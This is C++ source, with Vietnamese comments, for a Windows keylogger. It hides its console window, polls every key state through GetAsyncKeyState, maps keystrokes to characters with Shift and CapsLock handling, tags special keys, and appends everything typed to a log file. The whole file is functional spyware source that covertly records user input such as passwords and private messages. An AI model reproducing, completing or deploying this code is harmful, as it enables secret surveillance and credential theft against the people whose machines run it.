#define _WIN32_WINNT 0x0500
#include "keylogger.h"

// Tạo tên file
std::string keylogger::generate_random_string(size_t length)
{
    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static std::mt19937 generator(std::random_device{}());
    std::uniform_int_distribution<size_t> distribution(0, characters.length() - 1);
    std::string random_string;
    random_string.reserve(length);
    for (size_t i = 0; i < length; ++i)
    {
        random_string += characters[distribution(generator)];
    }
    return random_string;
}

// Thêm các ký tự mới vào file keylogger
void keylogger::LOG(const string &input)
{
    std::string current_path;
    {
        std::lock_guard<std::mutex> lock(mtx);
        if (path.empty()) {
            return;
        }
        current_path = path; 
    } 
    std::ofstream logFile(current_path, std::ios::app);
    if (logFile.is_open())
    {
        logFile << input;
    }
}
char VkCodeToChar(int vkCode) {
    // Sử lý CapLock, NumLock.
    bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

    switch (vkCode) {
        // Xử lý các phím số không có Shift
        case '0': return shift_pressed ? ')' : '0';
        case '1': return shift_pressed ? '!' : '1';
        case '2': return shift_pressed ? '@' : '2';
        case '3': return shift_pressed ? '#' : '3';
        case '4': return shift_pressed ? '$' : '4';
        case '5': return shift_pressed ? '%' : '5';
        case '6': return shift_pressed ? '^' : '6';
        case '7': return shift_pressed ? '&' : '7';
        case '8': return shift_pressed ? '*' : '8';
        case '9': return shift_pressed ? '(' : '9';

        // Xử lý các chữ với CapLock và Shift
        case 'A' ... 'Z': { 
            bool caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            if (shift_pressed == caps_lock) {
                return static_cast<char>(vkCode); // Lowercase
            } else {
                return static_cast<char>(vkCode - 32); // Uppercase (A=65, a=97)
            }
        }
        
        // Xử lý dấu câu và các ký tự
        case VK_OEM_1: return shift_pressed ? ':' : ';';
        case VK_OEM_2: return shift_pressed ? '?' : '/';
        case VK_OEM_3: return shift_pressed ? '~' : '`';
        case VK_OEM_4: return shift_pressed ? '{' : '[';
        case VK_OEM_5: return shift_pressed ? '|' : '\\';
        case VK_OEM_6: return shift_pressed ? '}' : ']';
        case VK_OEM_7: return shift_pressed ? '"' : '\'';
        case VK_OEM_PERIOD: return shift_pressed ? '>' : '.';
        case VK_OEM_COMMA: return shift_pressed ? '<' : ',';
        case VK_OEM_MINUS: return shift_pressed ? '_' : '-';
        case VK_OEM_PLUS: return shift_pressed ? '+' : '=';
        
        // Xử lý dấu cách, tab
        case VK_SPACE: return ' ';
        case VK_TAB: return '\t';
        
        default:
            return 0; 
    }
}
// Xử lý các phím đặc biệt
bool keylogger::HandleSpecialKey(int keyCode)
{
    switch (keyCode)
    {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case VK_SHIFT:
        LOG("[SHIFT]");
        return true;
    case VK_BACK:
        LOG("[BACKSPACE]");
        return true;
    case VK_RBUTTON:
        LOG("[RIGHT_CLICK]");
        return true;
    case VK_CAPITAL:
        LOG("[CAPS_LOCK]");
        return true;
    case VK_TAB:
        LOG("[TAB]");
        return true;
    case VK_UP:
        LOG("[UP_ARROW]");
        return true;
    case VK_DOWN:
        LOG("[DOWN_ARROW]");
        return true;
    case VK_LEFT:
        LOG("[LEFT_ARROW]");
        return true;
    case VK_RIGHT:
        LOG("[RIGHT_ARROW]");
        return true;
    case VK_CONTROL:
        LOG("[CTRL]");
        return true;
    case VK_MENU:
        LOG("[ALT]");
        return true;
    default:
        return false;
    }
}

// Xem thử key có thể in ra dưới dạng ASCII
bool keylogger::IsPrintable(int key)
{
    return (key >= 32 && key <= 126);
}

void keylogger::Keylogger()
{
    // Giấu window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    LOG("\n[Keylogger Started]\n");

   
    while (keyloggerON) {
        if (keyloggerRunning) {
            Sleep(70); // Tránh việc sử dụng quá nhiều CPU
            for (int key = 8; key <= 255; ++key) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    char c = VkCodeToChar(key);
                    if (c != 0) {
                        LOG(std::string(1, c));
                    } else {
                        HandleSpecialKey(key);
                    }
                }
            }
        } else {
            Sleep(100);
        }
    }
}
